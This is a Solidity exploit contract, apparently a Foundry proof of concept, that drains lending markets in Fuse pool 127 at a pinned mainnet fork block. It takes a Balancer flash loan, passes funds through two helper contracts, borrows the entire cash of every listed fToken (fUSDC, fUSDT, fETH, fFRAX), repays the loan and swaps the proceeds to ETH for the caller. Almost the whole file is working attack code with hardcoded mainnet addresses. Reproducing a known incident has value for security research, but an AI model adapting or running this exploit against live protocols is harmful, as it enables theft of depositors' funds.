// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

// import "forge-std/Test.sol";
// import "forge-std/console.sol";

import "../HarvestFF/interfaces/IFlashLoanReceiver.sol";
import "../HarvestFF/interfaces/ILendingPool.sol";
import "../HarvestFF/interfaces/ILendingPoolAddressesProvider.sol";
import "../HarvestFF/interfaces/IERC20.sol";
import "../HarvestFF/interfaces/IUniswapV2Router02.sol";

import "./interfaces/CErc20Interface.sol";
import "./interfaces/ComptrollerInterface.sol";

// import "./Convert127.sol";

// fork_block_number = 14684685
interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}
interface UniSwapV2 {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}
interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint deadline;
        uint amountIn;
        uint amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external payable returns (uint amountOut);

    struct ExactInputParams {
        bytes path;
        address recipient;
        uint deadline;
        uint amountIn;
        uint amountOutMinimum;
    }
    function exactInput(
        ExactInputParams calldata params
    ) external payable returns (uint amountOut);
}

interface IUniswapV2Pair {
    function swap(
    uint256 amount0Out,
    uint256 amount1Out,
    address to,
    bytes calldata data) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
interface IUSDT {
    function approve(address _spender, uint256 _value) external;
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address _to, uint256 _value) external;
}

interface IWETH {
    function transfer(address to, uint value) external returns (bool);
    function deposit() external payable;
    function withdraw(uint wad) external;
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transferFrom(address sender, address recipient, uint256 amount) external;
}

interface IFETH {
    function mint() external payable;
    function getCash() external view returns (uint);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
    function redeem(uint redeemTokens) external returns (uint);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transferFrom(address sender, address recipient, uint256 amount) external;
}

interface IVault {
    function flashLoan(
        address receiver,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IConvert {
    // function gamja(address _fToken, uint256 _amount) external payable;
    function _bootLoad(address fToken) external;
    function _cBorrow(uint cBorrow) external;
    function _cMint() external;
    function _cRedeemAll() external;
}

contract ExploitTest {
// contract ExploitTest is Test {
    ComptrollerInterface unitroller = ComptrollerInterface(0x3f2D1BC6D02522dbcdb216b2e75eDDdAFE04B16F); // Unitroller
    
    CErc20Interface fUSDC = CErc20Interface(payable(0xEbE0d1cb6A0b8569929e062d67bfbC07608f0A47));   // 0xb1&#39;s Kitchen Sink USD Co... (fUSDC-127)
    CErc20Interface fUSDT = CErc20Interface(payable(0xe097783483D1b7527152eF8B150B99B9B2700c8d));   // fUSDT-127
    CErc20Interface fETH = CErc20Interface(payable(0x26267e41CeCa7C8E0f143554Af707336f27Fa051));    // fETH-127
    CErc20Interface fFRAX = CErc20Interface(payable(0x8922C1147E141C055fdDfc0ED5a119f3378c8ef8));   // fFRAX-127
    CErc20Interface[] fTokens = [fUSDC, fUSDT, fETH, fFRAX];

    // CErc20Interface fFRAX156 = CErc20Interface(payable(0x5CaDc2a04921213DE60B237688776e0F1A7155E6));   // fFRAX-156

    IUniswapV2Router uniswap = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    // balancer protocol flash loan check
    IUSDT constant USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 constant FRAX = IERC20(0x853d955aCEf822Db058eb8505911ED77F175b99e);

    IERC20 constant USDTSWAP = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);


    // uniswap
    IUniswapV2Router uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    ISwapRouter constant uniswapV3router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    // balancer check
    address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8; 
    IVault balancerVault = IVault(BALANCER_VAULT);

    address me;
    address ca;
    address oca;
    address oca2;
    // FxToken Address
    address fTokenCache;
    uint256 mintTokenCache;

    constructor() {
        // payable(address(0x0)).transfer(address(this).balance);
        me = address(tx.origin);
        ca = address(this);
        // oca = new Convert127();
        // oca2 = new Convert127();
        oca = address(0x4E3BC8c55604c2d49390e9824edF0dC2fe2bF493);
        oca2 = address(0xFc9F10773169f3F1b370dc70B30eb44358A904E5);

    }

    function testExploit() public {
        uint256 _default = 79228162514264337593543950335;

        payable(address(0x0)).transfer(address(this).balance);
        // emit log_named_uint("CA: WETH balance", WETH.balanceOf(address(this)));        
        // emit log_named_uint("EOA: ETH balance", address(tx.origin).balance);

        // balancer flash loan
        IERC20[] memory tokens = new IERC20[](2);
        uint256[] memory amounts = new uint256[](2);
        
        tokens[0] = USDC;
        tokens[1] = WETH;
        amounts[0] = 150000000 * 10**6; // attacker USDC
        amounts[1] = 50000000000000000000000; // attacker WETH
        
        sendFlashLoan(tokens, amounts);

        uint256 _profitUSDC = USDC.balanceOf(address(this));
        
        uint256 _profitFRAX = FRAX.balanceOf(address(this));
        // emit log_named_uint("CA: USDC balance", _profitUSDC);
        
        // emit log_named_uint("CA: FRAX balance", _profitFRAX);

        unchecked {
            uint256 _profitUSDC = USDC.balanceOf(address(this));
            uniswapSwapToWETH(_profitUSDC, USDC);
            uint256 _profitUSDT = USDTSWAP.balanceOf(address(this));
            uniswapSwap(_profitUSDT, USDTSWAP);
            uint256 _profitFRAX = FRAX.balanceOf(address(this));
            uniswapSwap(_profitFRAX, FRAX);
            IWETH(address(WETH)).withdraw(IWETH(address(WETH)).balanceOf(address(this)));
            payable(tx.origin).transfer(address(this).balance);     
        }


        // emit log_named_uint("PROFIT(127) EOA: ETH balance", address(tx.origin).balance - _default);
    }

    function uniswapSwap(uint256 _amountIn, IERC20 _tokens) internal {
        _tokens.approve(address(uniswapRouter), _amountIn);
        _tokens.approve(address(this), _amountIn);
    
        address[] memory path = new address[](2);
        path[0] = address(_tokens);
        path[1] = address(WETH);
        uniswapRouter.swapExactTokensForTokens(_amountIn, 0, path, address(this), block.timestamp);
    }
    function uniswapSwapToWETH(uint256 _amountIn, IERC20 _tokens) internal {
        // _tokens.approve(address(uniswapV3router), _amountIn);
        // _tokens.approve(address(this), _amountIn);
    
        address[] memory path = new address[](2);
        path[0] = address(_tokens);
        path[1] = address(WETH);
        
        uint amountOut = swapExactInputSingleHop(path[0],path[1], 3000, _amountIn);

        // IUniswapV2Router(address(0x9A0CC6791a5409ce3547F1f1d00e058c79D0A72c)).swapExactTokensForTokens(_amountIn, 0, path, address(this), block.timestamp);
    }
    function swapExactInputSingleHop(
        address tokenIn,
        address tokenOut,
        uint24 poolFee,
        uint amountIn
    ) public returns (uint amountOut) {
        // IERC20(tokenIn).transferFrom(msg.sender, address(this), amountIn);
        IERC20(tokenIn).approve(address(uniswapV3router), amountIn);
        IERC20(tokenIn).approve(address(this), amountIn);


        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
            .ExactInputSingleParams({
                tokenIn: tokenIn,
                tokenOut: tokenOut,
                fee: poolFee,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: amountIn,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            });

        amountOut = uniswapV3router.exactInputSingle(params);
    }
    receive() external payable {
        // emit log_named_uint("ETH", msg.value);
    }

    function sendFlashLoan(IERC20[] memory tokens, uint256[] memory amounts) public {
        uint _tokens_len = tokens.length;
        uint _amounts_len = amounts.length;

        IERC20[] memory _tokens = new IERC20[](_tokens_len);
        uint256[] memory _amounts = new uint256[](_amounts_len);
        
        for (uint i = 0; i < _tokens_len; i++) {
            _tokens[i] = tokens[i];
            _amounts[i] = amounts[i];
        }
        balancerVault.flashLoan(address(this), _tokens, _amounts, "");
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        tokens[0].transfer(address(oca), amounts[0]);
        // IConvert(oca).gamja(address(fTokens[0]), IFETH(address(fETH)).getCash());
        IConvert(oca)._bootLoad(address(fTokens[0]));
        IConvert(oca)._cMint();
        // emit log_named_uint("FETH", IFETH(address(fETH)).getCash());
        IConvert(oca)._cBorrow(IFETH(address(fETH)).getCash());
        IConvert(oca)._cRedeemAll();

        IWETH(address(WETH)).withdraw(50000000000000000000000);
        IFETH(address(fETH)).mint{value: 50000000000000000000000}();


        address[] memory cToken = new address[](1);
        cToken[0] = address(fETH);
        unitroller.enterMarkets(cToken);

        for (uint8 i=0; i < fTokens.length;) {
            unchecked {
                CErc20Interface _fToken = fTokens[i];
                _fToken.borrow(_fToken.getCash());   
                i++;
            }
        }
        
        tokens[0].transfer(address(oca2), amounts[0]);
        
        IConvert(oca2)._bootLoad(address(fTokens[0]));
        IConvert(oca2)._cMint();
        (uint256 _x, uint256 _y, uint256 _z) = unitroller.getAccountLiquidity(address(oca2));
        // emit log_named_uint("_y", _y);
        IConvert(oca2)._cBorrow(_y);
        IConvert(oca2)._cRedeemAll();
        // IConvert(oca2).gamja(address(fTokens[0]), _y);
        // emit log_named_uint("FETH", IFETH(address(fETH)).getCash());
        IFETH(address(fETH)).redeemUnderlying(IFETH(address(fETH)).getCash());
        
        // emit log_named_uint("CA: ETH balance", address(this).balance);
        IWETH(address(WETH)).deposit{value: 50000000000000000000000}();
        IWETH(address(WETH)).transfer(msg.sender, 50000000000000000000000);

        uint256 new_fee = feeAmounts[0];
        tokens[0].transfer(msg.sender, amounts[0] + new_fee);     

        payable(tx.origin).transfer(address(this).balance);
    }
}
